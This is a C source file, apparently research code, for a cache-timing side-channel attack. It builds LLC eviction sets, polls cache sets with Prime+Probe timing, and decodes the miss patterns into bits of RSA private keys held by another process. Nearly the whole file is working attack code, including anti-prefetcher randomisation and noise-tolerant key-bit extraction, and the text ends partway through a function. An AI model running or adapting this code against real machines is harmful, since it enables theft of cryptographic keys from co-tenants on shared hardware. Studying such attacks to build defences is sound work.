#include "EvictionSet.h"
#include "CacheFuncs.h"

#include <time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <math.h>



int firstTry = 1;
int NUMBER_OF_KEYS_TO_SAMPLE = 100;

//#define PRINTF printf
#define PRINTF(bla...)

char* RsaKeys[NUMBER_OF_DIFFERENT_KEYS];
extern char client_message[1];
extern int client_sock;
extern int read_size;

#if KEYS_LEN_IN_BITS == 4096
int PATTERN_LEN = 7;
//#define MAX_WRONG_ZEROS 1
//#define MAX_WRONG_ONES  1
int MAX_WRONG_ZEROS = 1;
int MAX_WRONG_ONES = 1;
#define MAX_SAMPLES_PER_BIT 9
#else
int PATTERN_LEN = 6;
#define MAX_WRONG_ZEROS 1
#define MAX_WRONG_ONES  1
#define MAX_SAMPLES_PER_BIT 8
#endif

#define BITS_IN_CHUNK 16
#define MAX_HANDLED_EXTRA_BITS 30
#define MAX_MISSING_BITS 300
#define MAX_WRONG_BITS_IN_CHUNK 2

#define BAD_BIT 0xa

LinesBuffer TestBuffer;
FILE *pFile;

/**
 * To make sure the pre-fetcher can't learn our cache usage, we randomize the order in which
 * we access lines in a set.
 */
void RandomizeRawSet(Raw_Cache_Set* pSet);

/**
 * Same thing but for a smaller set.
 *
 * TODO: merge these 2 functions, no real reason to have double of these.
 */
void RandomizeSet(Cache_Set* pSet);

/**
 * Gets a list of lines, and a line that conflicts with them.
 *
 * Goes over the list and searches for the exact subset that causes the conflict.
 * Then returns it in the pSmallSet pointer.
 * Returns the number of lines in said set.
 */
int FindSet(Raw_Cache_Set* pBigSet, Cache_Set* pSmallSet, char* pConflictingLine);

/**
 * Returns the number of set a certain address is associated with
 */
int AdressToSet(char* Adress);

/**
 * Sorts a set of statistics in a Cache_Statistics struct.
 *
 * Returns the sorted list in the StatisticsToSort pointer.
 */
void SortStatistics(Cache_Statistics* BaseStatistics, Cache_Statistics* StatisticsToSort);

/**
 * Takes a string representing a hex number, and returns a newly allocated
 * buffer with the data translated to binary.
 */
char* StringToBuff(char* String);

void noiseRandLine(Cache_Mapping* pEvictionSets, int* suspectsSets , int suspectsNum);
void noiseRandSets(Cache_Mapping* pEvictionSets, int* suspectsSets , int suspectsNum, int numOfSetsToNoise);


/**
 * This is basically a mem_cmp function, written for debug purposes.
 * It returns at which byte did the first difference occur (+1 or -1,
 * depending on which buff had the larger char).
 */
int memcmp_dbg(char* pFirstBuff, char* pSecondBuff, int nBuffsLen) {
	int nCurrByte;
	for (nCurrByte = 0; nCurrByte < nBuffsLen; nCurrByte++) {
		if (pFirstBuff[nCurrByte] > pSecondBuff[nCurrByte]) {
			return nCurrByte + 1;
		} else if (pFirstBuff[nCurrByte] < pSecondBuff[nCurrByte]) {
			return -nCurrByte - 1;
		}
	}

	return 0;
}

int CreateEvictionSetFromBuff(LinesBuffer* pBuffer, Cache_Mapping* pEvictionSets)
{
	return CreateEvictionSetFromMem(pBuffer->Lines->Bytes, sizeof(LinesBuffer), pEvictionSets);
}

int CreateEvictionSetFromMem(char* Memory, uint32_t Size, Cache_Mapping* pCacheSets)
{
	int i, j;
	Raw_Cache_Mapping RawMapping;
	int FilledSetIndex = 0;
	int SetsInCurrModulu;
	int CurrSetInSlice;
	int FindSetAttempts;

	memset(pCacheSets, 0, sizeof(Cache_Mapping));
	memset(&RawMapping, 0, sizeof(RawMapping));

	// Go over all raw sets and split them to real sets.
	for (j = 0; j < RAW_SETS; j++)
	{
		for (i = j * BYTES_IN_LINE, SetsInCurrModulu = 0; i < Size && SetsInCurrModulu < SLICE_NUM; i += BYTES_IN_LINE * RAW_SETS)
		{
			// Get bit 1 of the slice.
			char* CurrAdress = Memory + i;
			int Set = AdressToSet(CurrAdress);
			int Miss = 0;

			// First of all, determine if this line belongs to a set we already found!
			for (CurrSetInSlice = FilledSetIndex - SetsInCurrModulu; CurrSetInSlice < FilledSetIndex; CurrSetInSlice++)
			{
				Miss = ProbeManyTimes(pCacheSets->Sets[CurrSetInSlice].Lines[0], pCacheSets->Sets[CurrSetInSlice].ValidLines, CurrAdress);

				// If the line conflicts with this set, give it up, we don't care about it no more
				if (Miss) break;
			}

			if (Miss) continue;

			// Now go over all the relevant sets and check
			RandomizeRawSet(&RawMapping.Sets[Set]);
			Miss = ProbeManyTimes(RawMapping.Sets[Set].Lines[0], RawMapping.Sets[Set].ValidLines, CurrAdress);

			// If its a miss, there is no conflict, insert line into raw set.
			if (!Miss) {
				if (RawMapping.Sets[Set].ValidLines >= RAW_LINES_IN_SET)
				{
					break;
				}

				RawMapping.Sets[Set].Lines[RawMapping.Sets[Set].ValidLines] = CurrAdress;
				RawMapping.Sets[Set].ValidLines++;
			}
			// A miss means we conflict with a set. find the conflicting set!
			else
			{
				// We try and find the set a few times... mostly because at some point in the past
				// The function wasn't stable enough.
				for (FindSetAttempts = 0; FindSetAttempts < 3; FindSetAttempts++)
				{
					int FoundNewSet = FindSet(&RawMapping.Sets[Set], &pCacheSets->Sets[FilledSetIndex], CurrAdress);
					SetsInCurrModulu += FoundNewSet;
					FilledSetIndex += FoundNewSet;

					if (FoundNewSet)
					{
						printf("Found set %d\r\n\033[1A", FilledSetIndex);
						RandomizeSet(&pCacheSets->Sets[FilledSetIndex]);
						break;
					}
				}
			}
		}
	}

	pCacheSets->ValidSets = FilledSetIndex;
	return FilledSetIndex;
}

int AdressToSet(char* Adress)
{
	return (((uint64_t)Adress >> 6) & 0b11111111111);
}

void RandomizeRawSet(Raw_Cache_Set* pSet)
{
	int LineIdx;
	int* LinesInSet = malloc(sizeof(int) * pSet->ValidLines);

	if (pSet->ValidLines == 0)
		return;

	// At the start of the randomization process, every line points to the
	// next line in the array.
	for (LineIdx = 0; LineIdx < pSet->ValidLines - 1; LineIdx++)
	{
		LinesInSet[LineIdx] = LineIdx + 1;
	}

	int LinesLeft = pSet->ValidLines - 1;
	int CurrLine = 0;

	// Now go over the linked list and randomize it
	for (LineIdx = 0; LineIdx < pSet->ValidLines && LinesLeft > 0; LineIdx++)
	{
		int NewPos = rand() % LinesLeft;
		unsigned int RandomLine = LinesInSet[NewPos];
		LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
		LinesInSet[LinesLeft - 1] = 0;
		LinesLeft--;
		*((uint64_t*)pSet->Lines[CurrLine]) = ((uint64_t)pSet->Lines[RandomLine]);
		CurrLine = RandomLine;
	}

	*((uint64_t*)pSet->Lines[CurrLine]) = 0;

	free(LinesInSet);
}

void RandomizeSet(Cache_Set* pSet)
{
	int LineIdx;
	int* LinesInSet = malloc(sizeof(int) * pSet->ValidLines);

	if (pSet->ValidLines == 0){
		free(LinesInSet);
		return;
	}

	// At the start of the randomization process, every line points to the
	// next line in the array.
	for (LineIdx = 0; LineIdx < pSet->ValidLines - 1; LineIdx++)
	{
		LinesInSet[LineIdx] = LineIdx + 1;
	}

	int LinesLeft = pSet->ValidLines - 1;
	int CurrLine = 0;

	// Now go over the linked list and randomize it
	for (LineIdx = 0; LineIdx < pSet->ValidLines && LinesLeft > 0; LineIdx++)
	{
		int NewPos = rand() % LinesLeft;
		unsigned int RandomLine = LinesInSet[NewPos];
		LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
		LinesInSet[LinesLeft - 1] = 0;
		LinesLeft--;
		*((uint64_t*)pSet->Lines[CurrLine]) = ((uint64_t)pSet->Lines[RandomLine]);
		CurrLine = RandomLine;
	}

	*((uint64_t*)pSet->Lines[CurrLine]) = 0;

	free(LinesInSet);
}

/**
 * Sometimes, when looking for a new set, we find too many lines.
 * This function tries to get rid of the most unlikely lines and go down to 12.
 */
int DecreaseSetSize(Raw_Cache_Set* pSmallSet, char* pConflictingLine)
{
	int ConflictLineIndex;
	char* pLinesAnchor;
	int i;
	int Attempts = 5;

	while (pSmallSet->ValidLines > LINES_IN_SET && Attempts)
	{
		RandomizeRawSet(pSmallSet);
		pLinesAnchor = pSmallSet->Lines[0];
		char* pLinesCurrentEnd = pSmallSet->Lines[0];
		Attempts--;

		// Find the end of the set
		while (*(char**)pLinesCurrentEnd != 0)
		{
			pLinesCurrentEnd = *(char**)pLinesCurrentEnd;
		}

		// Find all the lines in the conflict set which are the same set as the target.
		for (ConflictLineIndex = 0; ConflictLineIndex < pSmallSet->ValidLines; ConflictLineIndex++)
		{
			char* pCurrLine = pLinesAnchor;

			if (pLinesAnchor == NULL)
			{
				break;
			}

			// Pop the first line out of the conflict set.
			pLinesAnchor = *((char**)pLinesAnchor);

			// If the line we removed conflicted with the new line, add the line to the set.
			if (!ProbeManyTimes(pLinesAnchor, pSmallSet->ValidLines - 1, pConflictingLine))
			{
				*((char**)pLinesCurrentEnd) = pCurrLine;
				pLinesCurrentEnd = pCurrLine;
			}
			// Line does not conflict, and is therefore not interesting, move it to non conflicting list.
			else
			{
				// Find the line in the small set and remove it.
				for (i = 0; i < pSmallSet->ValidLines; i++)
				{
					if (pSmallSet->Lines[i] == pCurrLine) {
						pSmallSet->Lines[i] = pSmallSet->Lines[pSmallSet->ValidLines - 1];
						pSmallSet->ValidLines --;
					}
				}

				if (pSmallSet->ValidLines <= LINES_IN_SET)
				{
					break;
				}
			}
		}
	}

	// Lets check wether these lines coincide
	if (pSmallSet->ValidLines == LINES_IN_SET)
	{
		RandomizeRawSet(pSmallSet);
		while (ProbeManyTimes(pSmallSet->Lines[0], pSmallSet->ValidLines, pConflictingLine))
		{
			return 1;
		}
	}

	return 0;
}

int FindSet(Raw_Cache_Set* pBigSet, Cache_Set* pSmallSet, char* pConflictingLine)
{
	char* pNewSetEnd 					= NULL;
	char* pNonConflictingAnchor 		= pBigSet->Lines[0];
	char* pLinesAnchor 					= pBigSet->Lines[0];
	char* pLinesCurrentEnd				= pBigSet->Lines[0];
	int ConflictLineIndex;
	int LineInEvictionSet 				= 0;
	int CurrentConflictSize 			= pBigSet->ValidLines;
	Raw_Cache_Set tmpSet;
	int SetFound						= 0;
	int BigSetIdx, SmallSetIdx;
	int WhileIdx = 0;
	int LinesToCheck;
	static int ElevenLinesSetsFound = 0;

	// Big set is the linked list with the potential lines for the set.
	// If its less then LINES_IN_SET there isn't really anything to do.
	if (pBigSet->Lines[0] == NULL || pBigSet->ValidLines < LINES_IN_SET)
		return 0;

	RandomizeRawSet(pBigSet);

	// Find the end of the set
	while (*(char**)pLinesCurrentEnd != 0)
	{
		pLinesCurrentEnd = *(char**)pLinesCurrentEnd;
	}

	// If we haven't found enough lines and not enough left to check, leave.
	if (pBigSet->ValidLines < 12)
	{
		return 0;
	}
	// If we have exactly 12 lines, then we already have the full set.
	else if (pBigSet->ValidLines == 12)
	{
		memcpy(&tmpSet, pBigSet, sizeof(tmpSet));
		LineInEvictionSet = 12;
	}
	// Many lines are available, need to extract the ones which belong to the set.
	else
	{
		// Due to noise we might not be able to filter all irrelevant lines on first try.
		// So keep trying!
		while (LineInEvictionSet < LINES_IN_SET)
		{
			LinesToCheck = pBigSet->ValidLines - LineInEvictionSet;
			WhileIdx++;

			// Remerge the 2 lists together, and try finding conflicting lines once more
			if (WhileIdx > 1)
			{
				*(char**)pNewSetEnd = pLinesAnchor;
				pLinesAnchor = pNonConflictingAnchor;
				CurrentConflictSize = pBigSet->ValidLines;
			}

			// Eh, if we tried 5 times and still haven't succeeded, just give up.
			// We don't want to work forever.
			if (WhileIdx > 5)
				break;

			pNewSetEnd = NULL;
			pNonConflictingAnchor = NULL;

			// Find all the lines in the conflict set which are the same set as the target.
			for (ConflictLineIndex = 0; ConflictLineIndex < LinesToCheck; ConflictLineIndex++)
			{
				char* pCurrLine = pLinesAnchor;

				if (pLinesAnchor == NULL)
				{
					break;
				}

				// Pop the first line out of the conflict set.
				pLinesAnchor = *((char**)pLinesAnchor);

				// If the line we removed conflicted with the new line, add the line to the set.
				if (!ProbeManyTimes(pLinesAnchor, CurrentConflictSize - 1, pConflictingLine))
				{
					tmpSet.Lines[LineInEvictionSet] = pCurrLine;
					*(char**)pCurrLine = 0;

					LineInEvictionSet++;
					*((char**)pLinesCurrentEnd) = pCurrLine;
					pLinesCurrentEnd = pCurrLine;
				}
				// Line does not conflict, and is therefore not interesting, move it to non conflicting list.
				else
				{
					if (pNewSetEnd == NULL)
						pNewSetEnd = pCurrLine;

					CurrentConflictSize--;
					*((char**)pCurrLine) = pNonConflictingAnchor;
					pNonConflictingAnchor = pCurrLine;
				}
			}
		}
	}

	// Lets check wether these lines conflict
	if (LineInEvictionSet >= LINES_IN_SET)			//Allow only 12 lines/set!!!!
	{
		tmpSet.ValidLines = LineInEvictionSet;
		RandomizeRawSet(&tmpSet);

		// Make sure the new set still conflicts with the line.
		if (ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine) &&
			ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine) &&
			ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine))
		{
			// If there are too many lines, keep trimming then down.
			if (LineInEvictionSet > LINES_IN_SET)
				SetFound = DecreaseSetSize(&tmpSet, pConflictingLine);
			else
				SetFound = 1;
		}

		// Yay, the set is valid, lets call it a day.
		if (SetFound)
		{
			if (LineInEvictionSet == 11)
			{
				ElevenLinesSetsFound++;
			}

			// Remove the lines in the new set from the list of potential lines.
			for (SmallSetIdx = 0; SmallSetIdx < tmpSet.ValidLines; SmallSetIdx++)
			{
				BigSetIdx = 0;
				pSmallSet->Lines[SmallSetIdx] = tmpSet.Lines[SmallSetIdx];

				while (BigSetIdx < pBigSet->ValidLines)
				{
					// if its the same line, remove it from the big set.
					if (pBigSet->Lines[BigSetIdx] == tmpSet.Lines[SmallSetIdx])
					{
						pBigSet->Lines[BigSetIdx] = pBigSet->Lines[pBigSet->ValidLines - 1];
						pBigSet->Lines[pBigSet->ValidLines - 1] = 0;
						pBigSet->ValidLines--;
						break;
					}

					BigSetIdx++;
				}
			}

			pSmallSet->ValidLines = tmpSet.ValidLines;

			return 1;
		} else {
			PRINTF("Bad set!\r\n");
		}
	} else
	{
		PRINTF("Not enough lines %d in set\r\n", LineInEvictionSet);
	}

	return 0;
}

void GetMemoryStatistics(Cache_Mapping* pEvictionSets, Cache_Statistics* pCacheStats)
{
	qword* pSetInterMissTimings[SETS_IN_CACHE];
	int pSetTimingsNum[SETS_IN_CACHE];
	int Set;
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	clock_gettime(CLOCK_REALTIME, &start);

	// Go over all sets in the cache and generate their statistics.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		pSetInterMissTimings[Set] = malloc(sizeof(qword) * (CACHE_POLL_SAMPLES_PER_SET + 1));
		pSetInterMissTimings[Set][0] = 0;
		pSetTimingsNum[Set] = 1;
		Miss = 0;

		// Sample the sets a pre-determined amount of times.
		for (Sample = 1; Sample <= CACHE_POLL_SAMPLES_PER_SET; Sample++)
		{
			clock_gettime(CLOCK_REALTIME, &start);

			Miss = PollAsm(pEvictionSets->Sets[Set].Lines[0], pEvictionSets->Sets[Set].ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

			// If we got a miss, add it to the statistics (do not need to add hits, since
			// all time slots were inited as hits by default.
			if (Miss)
			{
				pSetInterMissTimings[Set][pSetTimingsNum[Set]] = Sample;
				pSetTimingsNum[Set]++;
			}

			do {
				clock_gettime(CLOCK_REALTIME, &end);
				TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
			} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO);

			PRINTF("Time probing cache: %ld ns, sleeping %ld ns.\n", elapsedTime, TimeSpent);
		}
	}

	printf("Parsing the data!\r\n");

	// Time to parse the data.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		double Mean = 0;
		double Var = 0;
		double Tmp;

		if (pSetTimingsNum[Set] <= 1)
			continue;

		Mean = pSetInterMissTimings[Set][pSetTimingsNum[Set] - 1];
		Mean /= (pSetTimingsNum[Set] - 1);
		pCacheStats->SetStats[Set].mean = Mean;
		pCacheStats->SetStats[Set].num = pSetTimingsNum[Set] - 1;
		pCacheStats->SetStats[Set].offset = (long int)(pEvictionSets->Sets[Set].Lines[0]) % (SETS_IN_SLICE * 64);

		// Calculate Mean and variance
		for (Sample = 1; Sample < pSetTimingsNum[Set]; Sample++)
		{
			Tmp = (pSetInterMissTimings[Set][Sample] - pSetInterMissTimings[Set][Sample - 1]) - Mean;
			Var += Tmp * Tmp;
		}

		Var /= (pSetTimingsNum[Set] - 1);
		pCacheStats->SetStats[Set].variance = Var;
	}

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		free(pSetInterMissTimings[Set]);
	}
}

void WriteStatisticsToFile(Cache_Statistics* pCacheStats, char* pFileName, int Sorted)
{
	FILE* pFile;
	pFile = fopen(pFileName, "wr");
	int Set;
	char Stats[150];
	Cache_Statistics SortedStats;

	if (Sorted)
	{
		SortStatistics(pCacheStats, &SortedStats);
	}

	// Time to parse the data.
	for (Set = SETS_IN_CACHE - 1; Set >= 0 ; Set--)
	{
		unsigned int SetNum = (unsigned int)SortedStats.SetStats[Set].mean;
		sprintf(Stats, "Set %d, Num %ld, mean %lf, var %lf, offset %lx\r\n", SetNum, (long int)pCacheStats->SetStats[SetNum].num,
				pCacheStats->SetStats[SetNum].mean, pCacheStats->SetStats[SetNum].variance, pCacheStats->SetStats[SetNum].offset);
		fwrite(Stats, strlen(Stats), 1, pFile);
	}

	fclose(pFile);
}

void SortStatistics(Cache_Statistics* BaseStatistics, Cache_Statistics* StatisticsToSort)
{
	unsigned int FirstIdx, SecondIdx, Set, tmp;

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		StatisticsToSort->SetStats[Set].num = BaseStatistics->SetStats[Set].num;
		StatisticsToSort->SetStats[Set].mean = Set;
	}

	for (FirstIdx = 0; FirstIdx < SETS_IN_CACHE; FirstIdx++)
	{
		for (SecondIdx = 0; SecondIdx + 1 < SETS_IN_CACHE - FirstIdx; SecondIdx++)
		{
			if (StatisticsToSort->SetStats[SecondIdx + 1].num < StatisticsToSort->SetStats[SecondIdx].num)
			{
				tmp = StatisticsToSort->SetStats[SecondIdx].num;
				StatisticsToSort->SetStats[SecondIdx].num = StatisticsToSort->SetStats[SecondIdx + 1].num;
				StatisticsToSort->SetStats[SecondIdx + 1].num = tmp;
				tmp = StatisticsToSort->SetStats[SecondIdx].mean;
				StatisticsToSort->SetStats[SecondIdx].mean = StatisticsToSort->SetStats[SecondIdx + 1].mean;
				StatisticsToSort->SetStats[SecondIdx + 1].mean = tmp;
			}
		}
	}
}

/**
 * This function polls the cache for samples of the set usage.
 *
 * Returns an allocated buffer with the requested samples.
 */
__always_inline char* PollForDataSamples(Cache_Set* pSet, uint64_t SamplesToRead)
{
	char* DataRead = malloc(sizeof(char) * SamplesToRead + 1);
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	clock_gettime(CLOCK_REALTIME, &start);

	// Get the samples.
	for (Sample = 1; Sample <= SamplesToRead; Sample++)
	{
		clock_gettime(CLOCK_REALTIME, &start);

		Miss = PollAsm(pSet->Lines[0], pSet->ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

Miss += PollAsm(pSet->Lines[0], pSet->ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

		DataRead[Sample] = (Miss > 0);

		// We want to make sure all samples are spread evenly, so we wait a little after the sample.
		// This is to reduce the effect of misses on the sample timings.
		do {
			clock_gettime(CLOCK_REALTIME, &end);
			TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
		} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO - CACHE_POLL_TIME_SAMPLE_DELAY);

		PRINTF("Time probing cache: %ld ns, sleeping %ld ns.\n", elapsedTime, TimeSpent);
	}

	DataRead[Sample] = 0;

	return DataRead;
}

/**
 * Prints to a file a line.
 * Will only print up to 50000 chars.
 *
 * This function is usefull because many of our buffers are very large, and reading large files
 * takes alot of time when we don't really need all hundred of thousands of samples.
 */
void PrintInLines2(FILE* pFile, char* pString, int LineSize, int Init) {
	static int nCharInLine = 0;

	if (Init) {
		nCharInLine = 0;
	}

	if (nCharInLine > 50000) {
		return;
	}

	fprintf(pFile, "%s", pString);
	nCharInLine++;

	if (nCharInLine % LineSize == 0) {
		fprintf(pFile, "\r\n");
	}
}

/**
 * This is kind of an ugly code...
 * This helper function is just to make PrintInLines2 to start counting
 * chars from 0.
 *
 * There is probably a better way of doing this but hell.
 */
void PrintInLines(FILE* pFile, char* pString, int LineSize) {
	PrintInLines2(pFile, pString, LineSize, 0);
}

/**
 * Takes an array of samples and translates them into actual bits, according to given patterns.
 *
 * In more detail:
 * We search the samples for the OnesPattern and ZerosPattern.
 * If we find them, we substitute these bits for the matching bit.
 * If not, we put a '?' to denote there was too much noise and we failed to identify the bit.
 *
 * We also give an option to write to file for debug purposes, and return a score describing
 * how many patterns were found (For purposes of determining how good this set is for further
 * sampling).
 * We also return how many bits were found in the pFoundBits pointer.
 *
 * Returns a pointer to an allocated buffer containing the translated bits.
 */
char* SamplesToDataBitsArray(char* Samples, char OnesPattern[], char ZerosPattern[], int PatternBitsNum,
		int SamplesNum, int WriteToFile, char* pFileName, int* pScore, int* pFoundBitsNum, int FindPattern)
{
	int CurrSample = 0;
	int Score = 0;
	int bit, i;
	int WrongBits;
	int OnesFound = 0;
	int ZerosFound = 0;
	int ForwardSteps = 2;
	int Step;
	int MaxWrongBits = MAX_WRONG_ZEROS;
	int* ZerosIndexes = malloc(sizeof(int) * SamplesNum / PatternBitsNum);
	int* OnesIndexes = malloc(sizeof(int) * SamplesNum / PatternBitsNum);
	int CurrZero;
	FILE* pFile;
	int DataLen = SamplesNum / PatternBitsNum + 1;
	char* ReadData = malloc(DataLen);

	char* TmpSamples = malloc(SamplesNum + 1);
	memcpy(TmpSamples, Samples, SamplesNum);

	// Write to file the samples before we start analyzing them.
	if (WriteToFile)
	{
		for (i = 0; i < SamplesNum; i++)
		{
			TmpSamples[i] += '0';
		}

		TmpSamples[SamplesNum] = 0;
		// If too many samples to easily read, only print the first 50k
		if (SamplesNum > 50000)
			TmpSamples[50000] = 0;

		pFile = fopen(pFileName, "wr");
		fprintf(pFile, "Samples:\r\n");
		//fprintf(pFile, "%s\r\n", TmpSamples);

		int Line = 0;
		for (Line = 0; Line < strlen(TmpSamples); Line += 100)
		{
			fprintf(pFile, "%.100s\r\n", TmpSamples + Line);
		}
	}

	memcpy(TmpSamples, Samples, SamplesNum);

	int ConsecutiveZeroes = 0;
	int Interruptions = 0;

	// For starters, make sure we do not confuse non-encryption areas with encryption areas.
	while (CurrSample < SamplesNum)
	{
		// Find groups of continous zeroes
		if (*(TmpSamples + CurrSample) == 0)
		{
			ConsecutiveZeroes++;
		}
		else if (ConsecutiveZeroes != 0)
		{
			// Enough consecutive zeroes found, annialate them!
			if (Interruptions >= 1 && ConsecutiveZeroes >= PatternBitsNum * 2)
			{
				memset(TmpSamples + CurrSample - ConsecutiveZeroes - Interruptions, BAD_BIT, ConsecutiveZeroes);
			}

			// If we have more than 1 sample interrupting the arrival of 0 bits, start counting from scratch.
			if (Interruptions > 1)
			{
				ConsecutiveZeroes = 0;
				Interruptions = 0;
			} else
			{
				Interruptions++;
			}
		}

		CurrSample++;
	}

	// Enough consecutive zeroes found, annialate them!
	if (ConsecutiveZeroes >= PatternBitsNum * 2)
	{
		memset(TmpSamples + CurrSample - ConsecutiveZeroes - Interruptions, BAD_BIT, ConsecutiveZeroes);
	}

	CurrSample = 0;

	// First we will try and find all the zeroes
	while (CurrSample + PatternBitsNum < SamplesNum)
	{
		int BestResult = MaxWrongBits + 1;
		int BestStep = 0;

		for (Step = 0; Step <= ForwardSteps; Step++)
		{
			WrongBits = 0;

			// Check we aren't over the array bounds.
			if (CurrSample + PatternBitsNum + Step >= SamplesNum)
			{
				break;
			}

			// Compare the first n bits with the patterns
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				WrongBits += ((*(TmpSamples + CurrSample + bit + Step) != *(ZerosPattern + bit)) ? 1 : 0);
			}

			// If the result is decent, compare it with the next few bits to
			// see if we can get an even better pattern.
			if (WrongBits < BestResult)
			{
				BestResult = WrongBits;
				BestStep = Step;
			}
			// If the result is bad, just skip to the next bit
			else
			{
				break;
			}
		}

		// If we found a zero pattern, zero all relevant samples to make sure they aren't used later for 1's
		if (BestResult <= MaxWrongBits)
		{
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				*(TmpSamples + CurrSample + BestStep + bit) = 0xe;
			}

			ZerosIndexes[ZerosFound++] = CurrSample + BestStep;
			Score += (MaxWrongBits - BestResult) + 1;
			CurrSample += PatternBitsNum + BestStep;
		}
		else
		{
			CurrSample++;
		}
	}

	CurrSample = 0;
	ForwardSteps = 1;
	CurrZero = 0;
	MaxWrongBits = MAX_WRONG_ONES;

	// Now do the same for ones
	while (CurrSample + PatternBitsNum < SamplesNum)
	{
		int BestResult = MaxWrongBits + 1;
		int BestStep = 0;

		if (CurrZero < ZerosFound && CurrSample > ZerosIndexes[CurrZero])
			CurrZero++;

		if (CurrZero < ZerosFound && CurrSample == ZerosIndexes[CurrZero])
			CurrSample += PatternBitsNum;

		for (Step = 0; Step <= ForwardSteps; Step++)
		{
			WrongBits = 0;

			// Check we aren't over the array bounds.
			if (CurrSample + PatternBitsNum + PatternBitsNum + Step >= SamplesNum)
			{
				break;
			}

			// Compare the first n bits with the patterns
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				WrongBits += (*(TmpSamples + CurrSample + bit + Step) != *(OnesPattern + bit));
			}

			// If the result is decent, compare it with the next few bits to
			// see if we can get an even better pattern.
			if (WrongBits < BestResult)
			{
				BestResult = WrongBits;
				BestStep = Step;
			}
			// If the result is bad, just skip to the next bit
			else
			{
				break;
			}
		}

		// If we found a one pattern, zero all relevant samples to make sure they aren't used later for 1's
		if (BestResult <= MaxWrongBits)
		{
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				*(TmpSamples + CurrSample + BestStep + bit) = 0xf;
			}

			OnesIndexes[OnesFound++] = CurrSample + BestStep;
			Score += (MaxWrongBits - BestResult) + 1 + (MAX_WRONG_ZEROS - MAX_WRONG_ONES);
			CurrSample += PatternBitsNum + BestStep + 1;
		}
		else
		{
			CurrSample++;
		}
	}

	// If we found way more zeroes then ones or the other way round, this probably isn't a real key.
	// Give this set a 0 score.
	if (OnesFound > ZerosFound * 4 ||
		ZerosFound > OnesFound * 4)
		Score = 0;

	// Only give a score if one was requested
	if (pScore != NULL)
		*pScore = Score;

	int CurrOnesIdx = 0;
	int CurrZeroIdx = 0;
	int LastIndex = -1;
	int LastBitEnd = 0;
	int BadBitsNum = 0;

	if (WriteToFile) {
		fprintf(pFile, "Indexes:\r\n");
		PrintInLines2(pFile, "\r\n", 100, 1);
	}

	// We now have a list of indexes to where in the samples we have found zeros and ones.
	// Now go over the samples and find in which areas we found neither a one nor a zero,
	// and mark that area as a '?' to note we missed a bit.
	while (CurrOnesIdx < OnesFound && CurrZeroIdx < ZerosFound)
	{
		// Check where was the last bit we identified.
		if (ZerosIndexes[CurrZeroIdx] < OnesIndexes[CurrOnesIdx])
		{
			LastIndex = ZerosIndexes[CurrZeroIdx];

			if (WriteToFile) {
				i = 0;
				while (LastBitEnd + i < LastIndex)
				{
					PrintInLines(pFile, " ", 100);
					i++;
				}
			}

			// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
			while (LastBitEnd + PatternBitsNum + 2 < LastIndex)
			{

				ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
				BadBitsNum++;
				LastBitEnd += PatternBitsNum + 1;
			}

			LastBitEnd = LastIndex + PatternBitsNum;
			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '0';

			if (WriteToFile) {
				for (i = 0; i < PatternBitsNum; i++)
				{
					PrintInLines(pFile, "0", 100);
				}
			}

			CurrZeroIdx++;
		} else
		{
			LastIndex = OnesIndexes[CurrOnesIdx];

			if (WriteToFile) {
				i = 0;
				while (LastBitEnd + i < LastIndex)
				{
					PrintInLines(pFile, " ", 100);
					i++;
				}
			}

			// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
			while (LastBitEnd + PatternBitsNum + 2 < LastIndex)
			{

				ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
				BadBitsNum++;
				LastBitEnd += PatternBitsNum + 1;
			}

			LastBitEnd = LastIndex + PatternBitsNum;
			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '1';

			if (WriteToFile) {
				for (i = 0; i < PatternBitsNum; i++)
				{
					PrintInLines(pFile, "1", 100);
				}
			}

			CurrOnesIdx++;
		}
	}

	// Either we finished going over the ones or zeros, so fill the rest of the bits accordingly.
	while (CurrOnesIdx < OnesFound)
	{
		LastIndex = OnesIndexes[CurrOnesIdx];

		// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
		while (LastBitEnd + PatternBitsNum < LastIndex)
		{

			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
			BadBitsNum++;
			LastBitEnd += PatternBitsNum + 1;
		}

		LastBitEnd = LastIndex + PatternBitsNum;

		ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '1';
		CurrOnesIdx++;
	}

	// We may have run over all ones but still have zeroes in the bank, continue filling '?' where
	// no zeroes are found.
	while (CurrZeroIdx < ZerosFound)
	{
		LastIndex = ZerosIndexes[CurrZeroIdx];

		// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
